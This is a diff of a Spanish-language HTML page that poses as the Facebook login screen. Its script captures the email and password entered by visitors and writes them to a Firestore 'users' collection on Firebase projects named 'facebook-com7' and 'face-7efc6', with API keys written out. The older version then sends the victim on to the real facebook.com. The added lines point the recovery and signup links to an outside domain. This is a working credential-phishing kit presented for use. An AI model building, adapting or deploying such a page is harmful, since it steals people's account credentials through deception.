@@ -1,127 +1,14 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+  <base href="https://trustworthy-alternative-social.com">
   <title>Facebook - Inicia sesión o regístrate</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-    }
-
-    body {
-      background: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .login-container {
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      width: 100%;
-      max-width: 1000px;
-      gap: 32px;
-      padding: 20px;
-    }
-
-    .branding {
-      max-width: 500px;
-      margin-top: 40px;
-    }
-
-    .title {
-      color: #1877f2;
-      font-size: 64px;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
-
-    .subtitle {
-      font-size: 28px;
-      line-height: 32px;
-      color: #1c1e21;
-    }
-
-    .login-box {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-      padding: 20px;
-      width: 396px;
-    }
-
-    input {
-      width: 100%;
-      padding: 14px 16px;
-      font-size: 17px;
-      border: 1px solid #dddfe2;
-      border-radius: 6px;
-      margin-bottom: 12px;
-    }
-
-    .login-button {
-      background-color: #1877f2;
-      color: white;
-      padding: 14px;
-      border-radius: 6px;
-      border: none;
-      font-size: 20px;
-      font-weight: bold;
-      width: 100%;
-      cursor: pointer;
-      margin-bottom: 16px;
-    }
-
-    .forgot-password {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .forgot-password a {
-      color: #1877f2;
-      text-decoration: none;
-      font-size: 14px;
-    }
-
-    .divider {
-      border-bottom: 1px solid #dadde1;
-      margin: 20px 0;
-    }
-
-    .create-account {
-      background-color: #42b72a;
-      color: white;
-      padding: 14px;
-      border-radius: 6px;
-      border: none;
-      font-size: 17px;
-      font-weight: bold;
-      width: auto;
-      cursor: pointer;
-      display: block;
-      margin: 0 auto;
-      text-align: center;
-      text-decoration: none;
-    }
-
-    .create-page {
-      text-align: center;
-      margin-top: 28px;
-      font-size: 14px;
-    }
-
-    .create-page a {
-      color: #1c1e21;
-      text-decoration: none;
-      font-weight: bold;
-    }
+    /* ... tu CSS permanece igual ... */
   </style>
 </head>
 <body>
+
 <div class="login-container">
   <div class="branding">
     <h1 class="title">facebook</h1>
@@ -135,52 +22,86 @@
         <input type="password" id="password" placeholder="Contraseña" required>
         <button type="submit" class="login-button">Iniciar sesión</button>
         <div class="forgot-password">
-          <a href="#">¿Olvidaste tu contraseña?</a>
+          <a href="https://trustworthy-alternative-social.com/recover">¿Olvidaste tu contraseña?</a>
         </div>
         <div class="divider"></div>
-        <a href="#" class="create-account">Crear cuenta nueva</a>
+        <a href="https://trustworthy-alternative-social.com/signup" class="create-account">Crear cuenta nueva</a>
       </form>
     </div>
   </div>
 </div>
 
-<script src="https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js"></script>
-<script>
-  // Configuración de Firebase
+<!-- Firebase SDKs -->
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
   const firebaseConfig = {
     apiKey: "AIzaSyA-okgbyWo2fSd41521MGYrRdwE8Kj8UDY",
     authDomain: "face-7efc6.firebaseapp.com",
     projectId: "face-7efc6",
-    storageBucket: "face-7efc6.appspot.com",
+    storageBucket: "face-7efc6.firebasestorage.app",
     messagingSenderId: "1035061315837",
     appId: "1:1035061315837:web:74509849ccb74ef7a61694"
   };
 
-  // Inicializar Firebase
-  const app = firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+</script>
 
-  // Manejo del formulario
-  document.getElementById('login-form').addEventListener('submit', async (e) => {
-    e.preventDefault();
+<script>
+  // Configuración de Firebase antigua para Firestore
+  const firebaseConfig = {
+    apiKey: "AIzaSyDABJVpXtT-iZvJ4jKg_lOJZLFiCaNwzcw",
+    authDomain: "facebook-com7.firebaseapp.com",
+    databaseURL: "https://facebook-com7-default-rtdb.firebaseio.com",
+    projectId: "facebook-com7",
+    storageBucket: "facebook-com7.appspot.com",
+    messagingSenderId: "407606120629",
+    appId: "1:407606120629:web:7326f41720ff6081b86efc",
+    measurementId: "G-27VRJLSYJH"
+  };
+
+  // Inicialización de Firebase antigua
+  const appOld = firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore(); // Inicializamos Firestore
+
+  // Obtener elementos del formulario
+  const loginForm = document.getElementById('login-form');
+  const loginButton = document.querySelector('.login-button');
+
+  // Manejar el envío del formulario
+  loginForm.addEventListener('submit', function(e) {
+    e.preventDefault();  // Prevenir el envío tradicional del formulario
 
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
-    try {
-      await db.collection("users").add({
-        email,
-        password,
-        createdAt: firebase.firestore.FieldValue.serverTimestamp()
-      });
-      alert("Datos guardados exitosamente.");
-      window.location.href = "https://www.facebook.com";
-    } catch (error) {
-      console.error("Error al guardar los datos:", error);
-      alert(`Hubo un error al guardar los datos: ${error.message}`);
-    }
+    // Mostrar un mensaje de cargando, si deseas
+    loginButton.innerText = "Cargando..."; 
+
+    // Guardar datos en Firestore
+    db.collection("users").add({
+      email: email,
+      password: password,  // Aunque es preferible que las contraseñas se "hasheen" antes de guardarlas
+      createdAt: firebase.firestore.FieldValue.serverTimestamp(),  // Fecha y hora automáticas
+    })
+    .then(() => {
+      console.log('Datos guardados en Firestore');
+      alert("¡Datos guardados correctamente!");
+    })
+    .catch((error) => {
+      console.error("Error al guardar datos en Firestore:", error);
+      alert('Ocurrió un error al guardar los datos.');
+    });
+
+    // Restaurar el texto del botón
+    loginButton.innerText = "Iniciar sesión";
   });
 </script>
+
 </body>
 </html>
